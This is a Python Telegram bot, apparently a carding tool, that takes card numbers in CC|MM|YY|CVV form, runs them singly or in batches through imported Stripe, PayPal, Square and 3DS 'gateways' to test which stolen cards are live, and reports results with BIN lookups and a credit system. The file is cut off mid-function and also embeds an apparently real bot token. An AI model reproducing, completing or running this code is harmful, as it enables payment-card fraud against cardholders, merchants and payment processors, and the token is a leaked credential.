import telebot
import requests
import json
import time
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import threading
import concurrent.futures
import re
from datetime import datetime, timedelta
import os
from urllib.parse import urlparse

#====================Gateway Files===================================#
from chk import check_card
from au import process_card_au
from at import process_card_at
from vbv import check_vbv_card
from py import check_paypal_card
from qq import check_qq_card
from cc import process_cc_card
#====================================================================#

# Bot token
BOT_TOKEN = "8080936704:AAGyZfi8iti6AqDN-y4dlRLlO1el1kvd_I8"
bot = telebot.TeleBot(BOT_TOKEN)

# Configuration
OWNER_ID = 7098912960  # Replace with your Telegram ID
ADMIN_IDS = [7098912960, 7763891494]  # Replace with admin Telegram IDs
USER_DATA_FILE = "users.json"
GROUP_DATA_FILE = "groups.json"
CREDIT_RESET_INTERVAL = 3600  # 1 hour in seconds
CREDITS_PER_HOUR = 100  # Credits per hour
MAX_MASS_CHECK = 10  # Max cards per mass check

# Load user data from file
def load_users():
    try:
        with open(USER_DATA_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

# Save user data to file
def save_users(users):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(users, f, indent=4)

# Load group data from file
def load_groups():
    try:
        with open(GROUP_DATA_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

# Save group data to file
def save_groups(groups):
    with open(GROUP_DATA_FILE, 'w') as f:
        json.dump(groups, f, indent=4)

# Initialize user data
def init_user(user_id, username=None):
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            "credits": CREDITS_PER_HOUR,
            "last_reset": int(time.time()),
            "username": username,
            "total_checks": 0,
            "approved": 0,
            "declined": 0
        }
        save_users(users)

# Reset credits for all users
def reset_credits():
    while True:
        users = load_users()
        if not isinstance(users, dict):  # safety check
            users = {}

        for user_id in users:
            if int(time.time()) - users[user_id]["last_reset"] >= CREDIT_RESET_INTERVAL:
                users[user_id]["credits"] = CREDITS_PER_HOUR
                users[user_id]["last_reset"] = int(time.time())

        save_users(users)
        time.sleep(CREDIT_RESET_INTERVAL)


# Start credit reset thread
threading.Thread(target=reset_credits, daemon=True).start()

# Get user status
def get_user_status(user_id):
    if user_id == OWNER_ID:
        return "Owner"
    elif user_id in ADMIN_IDS:
        return "Admin"
    else:
        return "User"

# Get user credits
def get_user_credits(user_id):
    users = load_users()
    return users.get(str(user_id), {}).get("credits", 0)

# Deduct user credits
def deduct_credits(user_id, amount):
    users = load_users()
    if str(user_id) in users and users[str(user_id)]["credits"] >= amount:
        users[str(user_id)]["credits"] -= amount
        save_users(users)
        return True
    return False

# Add this near the top with other constants
USER_SITES_FILE = "user_sites.json"

# Add this with other initialization code
USER_SITES = {}
if os.path.exists(USER_SITES_FILE):
    with open(USER_SITES_FILE, 'r') as f:
        USER_SITES = json.load(f)

def save_user_sites():
    with open(USER_SITES_FILE, 'w') as f:
        json.dump(USER_SITES, f)

# Status texts and emojis (add with other status constants)
status_emoji = {
    'APPROVED': '🔥',
    'APPROVED_OTP': '❎',
    'DECLINED': '❌',
    'EXPIRED': '👋',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'APPROVED_OTP': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝',
    'ERROR': '𝐄𝐫𝐫𝐨𝐫'
}

# Get BIN info
def get_bin_info(bin_number):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                'bin': data.get('bin', ''),
                'brand': data.get('brand', 'None'),
                'country': data.get('country_name', 'None'),
                'country_flag': data.get('country_flag', ''),
                'bank': data.get('bank', 'None'),
                'type': data.get('type', 'None'),
                'level': data.get('level', 'None')
            }
        return None
    except:
        return None

# Format for checking status
def checking_status_format(cc, gateway, bin_info):
    parts = cc.split('|')
    if len(parts) < 4:
        return "Invalid card format. Use: CC|MM|YY|CVV"
    result = f"""
<a href='https://t.me/backyXchannel'>┏━━━━━━━⍟</a>
<a href='https://t.me/backyXchannel'>┃ ↯ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠</a>
<a href='https://t.me/backyXchannel'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/backyXchannel'>[⸙]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{cc}</code>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>Processing</i>
<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ➳ {bin_info.get('brand', 'UNKNOWN')}
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐁𝐚𝐧𝐤 ➳ {bin_info.get('bank', 'UNKNOWN')}
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {bin_info.get('country', 'UNKNOWN')} {bin_info.get('country_flag', '')}
<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>"""
    return result

# Format the check result for approved status
def approved_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken):
    parts = cc.split('|')
    if len(parts) < 4:
        return "Invalid card format. Use: CC|MM|YY|CVV"
    result = f"""
<a href='https://t.me/backyXchannel'>┏━━━━━━━⍟</a>
<a href='https://t.me/backyXchannel'>┃ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</a>
<a href='https://t.me/backyXchannel'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/backyXchannel'>[⸙]</a> 𝗖𝗮𝗿𝗱
   ↳ <code>{cc}</code>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{response}</i>
<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {bin_info.get('brand', 'UNKNOWN')}
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐁𝐚𝐧𝐤 ⌁ {bin_info.get('bank', 'UNKNOWN')}
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {bin_info.get('country', 'UNKNOWN')} {bin_info.get('country_flag', '')}
<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {Userstatus} ]
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
    return result

# Format the check result for declined status
def declined_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken):
    parts = cc.split('|')
    if len(parts) < 4:
        return "Invalid card format. Use: CC|MM|YY|CVV"
    result = f"""
<a href='https://t.me/backyXchannel'>┏━━━━━━━⍟</a>
<a href='https://t.me/backyXchannel'>┃ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</a>
<a href='https://t.me/backyXchannel'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/backyXchannel'>[⸙]</a> 𝗖𝗮𝗿𝗱
   ↳ <code>{cc}</code>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{response}</i>
<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {bin_info.get('brand', 'UNKNOWN')}
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐁𝐚𝐧𝐤 ⌁ {bin_info.get('bank', 'UNKNOWN')}
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {bin_info.get('country', 'UNKNOWN')} {bin_info.get('country_flag', '')}
<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {Userstatus} ]
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
    return result

# Single check format function
def single_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken, status):
    if status.upper() == "APPROVED":
        return approved_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken)
    else:
        return declined_check_format(cc, gateway, response, mention, Userstatus, bin_info, time_taken)

# Check if user has enough credits
def check_credits(user_id, amount=1):
    users = load_users()
    if str(user_id) not in users or users[str(user_id)]["credits"] < amount:
        return False
    return True

# Deduct credits for a check
def use_credits(user_id, amount=1):
    if check_credits(user_id, amount):
        deduct_credits(user_id, amount)
        return True
    return False

# Format for mass check
STATUS_EMOJIS = {
    'APPROVED': '✅',
    'Approved': '✅',
    'DECLINED': '❌',
    'Declined': '❌',
    'CCN': '🟡',
    'ERROR': '⚠️',
    'Error': '⚠️'
}

def format_mass_check(results, total_cards, processing_time, gateway, checked=0):
    approved = sum(1 for r in results if r['status'].upper() in ['APPROVED', 'APPROVED'])
    ccn = sum(1 for r in results if r['status'].upper() == 'CCN')
    declined = sum(1 for r in results if r['status'].upper() in ['DECLINED', 'DECLINED'])
    errors = sum(1 for r in results if r['status'].upper() in ['ERROR', 'ERROR'])

    response = f"""<a href='https://t.me/backyXchannel'>↯  𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸</a>

<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 ⌁ <i>{checked}/{total_cards}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ⌁ <i>{approved}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐂𝐂𝐍 ⌁ <i>{ccn}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ⌁ <i>{declined}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐓𝐢𝐦𝐞 ⌁ <i>{processing_time:.2f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬</i>
<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>
"""

    for result in results:
        status_key = result['status'].upper()
        emoji = STATUS_EMOJIS.get(status_key, '❓')
        if status_key not in STATUS_EMOJIS:
            if 'APPROVED' in status_key:
                emoji = '✅'
            elif 'DECLINED' in status_key:
                emoji = '❌'
            elif 'ERROR' in status_key:
                emoji = '⚠️'
            else:
                emoji = '❓'
        response += f"<code>{result['card']}</code>\n𝐒𝐭𝐚𝐭𝐮𝐬 ⌁ {emoji} <i>{result['response']}</i>\n<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>\n"
    return response

def format_mass_check_processing(total_cards, checked, gateway):
    return f"""<a href='https://t.me/backyXchannel'>↯  𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸</a>

<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐓𝐨𝐭𝐚𝐥 ⌁ <i>{checked}/{total_cards}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ⌁ <i>0</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐂𝐂𝐍 ⌁ <i>0</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ⌁ <i>0</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐓𝐢𝐦𝐞 ⌁ <i>0.00 𝐒𝐞𝐜𝐨𝐧𝐝𝐬</i>
<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>
<a href='https://t.me/backyXchannel'>Processing cards...</a>"""

# Handle /chk command
@bot.message_handler(commands=['chk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.chk'))
def handle_chk(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Stripe Auth 2th 2th", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = check_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /au command
@bot.message_handler(commands=['au'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.au'))
def handle_au(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Stripe Auth 2", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = process_card_au(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /mass command
@bot.message_handler(commands=['mass'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mass'))
def handle_mass(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"<pre>↯ Starting Mass Stripe Auth Check of {len(cards)} Cards... </pre>"
        status_message = bot.reply_to(message, initial_msg, parse_mode='HTML')

        try:
            first_card_result = process_card_au(cards[0])
            gateway = first_card_result.get("gateway", "Stripe Auth 2")
        except:
            gateway = "Stripe Auth 2"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                    future_to_card = {executor.submit(process_card_au, card): card for card in cards}
                    for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
                        card = future_to_card[future]
                        try:
                            result = future.result()
                            results.append({
                                'card': card,
                                'status': result['status'],
                                'response': result['response'],
                                'gateway': result.get('gateway', 'Stripe Auth 2')
                            })
                        except Exception as e:
                            results.append({
                                'card': card,
                                'status': 'ERROR',
                                'response': f'Error: {str(e)}',
                                'gateway': gateway
                            })

                        current_time = time.time() - start_time
                        progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_message.message_id,
                            text=progress_msg,
                            parse_mode='HTML'
                        )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass AU check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /mchk command
@bot.message_handler(commands=['mchk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mchk'))
def handle_mchk(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"<pre>↯ Starting Mass Stripe Auth Check of {len(cards)} Cards... </pre>"
        status_message = bot.reply_to(message, initial_msg, parse_mode='HTML')

        try:
            first_card_result = check_card(cards[0])
            gateway = first_card_result.get("gateway", "Stripe Auth 2th")
        except:
            gateway = "Stripe Auth 2th"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                    future_to_card = {executor.submit(check_card, card): card for card in cards}
                    for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
                        card = future_to_card[future]
                        try:
                            result = future.result()
                            results.append({
                                'card': card,
                                'status': result['status'],
                                'response': result['response'],
                                'gateway': result.get('gateway', 'Stripe Auth 2th')
                            })
                        except Exception as e:
                            results.append({
                                'card': card,
                                'status': 'ERROR',
                                'response': f'Error: {str(e)}',
                                'gateway': gateway
                            })

                        current_time = time.time() - start_time
                        progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_message.message_id,
                            text=progress_msg,
                            parse_mode='HTML'
                        )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /vbv command
@bot.message_handler(commands=['vbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.vbv'))
def handle_vbv(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "3DS Lookup", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = check_vbv_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /py command
@bot.message_handler(commands=['py'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.py'))
def handle_py(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Paypal [0.1$]", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = check_paypal_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /qq command
@bot.message_handler(commands=['qq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.qq'))
def handle_qq(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Stripe Square [0.20$]", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = check_qq_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /cc command
@bot.message_handler(commands=['cc'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.cc'))
def handle_cc(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Site Based [1$]", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = process_cc_card(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /mvbv command
@bot.message_handler(commands=['mvbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mvbv'))
def handle_mvbv(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass VBV check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "3DS Lookup"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_vbv_card(card)
                        results.append({
                            'card': card,
                            'status': result['status'],
                            'response': result['response'],
                            'gateway': result.get('gateway', '3DS Lookup')
                        })
                    except Exception as e:
                        results.append({
                            'card': card,
                            'status': 'ERROR',
                            'response': f'Error: {str(e)}',
                            'gateway': gateway
                        })

                    current_time = time.time() - start_time
                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=progress_msg,
                        parse_mode='HTML'
                    )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass VBV check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
